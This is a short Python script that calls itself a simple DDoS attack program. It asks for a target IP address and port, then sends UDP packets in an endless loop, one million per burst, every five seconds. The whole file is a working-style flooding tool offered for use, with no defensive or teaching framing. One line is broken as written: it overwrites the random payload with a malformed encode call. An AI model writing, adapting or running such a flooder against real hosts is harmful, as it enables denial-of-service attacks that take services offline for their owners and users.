# Program make a simple ddos attack
# Copyright (C) mustafa falah
import os 
import sys
import random
import socket
import timeit
import time
socket.socket
ss=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes=random._urandom(1490)
bytes= str.encode('utf-8')
ip=input("Enter IP: ")
port=input("Enter the port number: ")
port=int(port)
def pkg(ip,port):
    def dos():ss.sendto(bytes,(ip,port))
    t=timeit.timeit(dos,number=1000000)
    print(t,'----',bytes.__sizeof__(),'bytes * 1000000 every 5sec')
    time.sleep(5)
while True : pkg(ip,port)

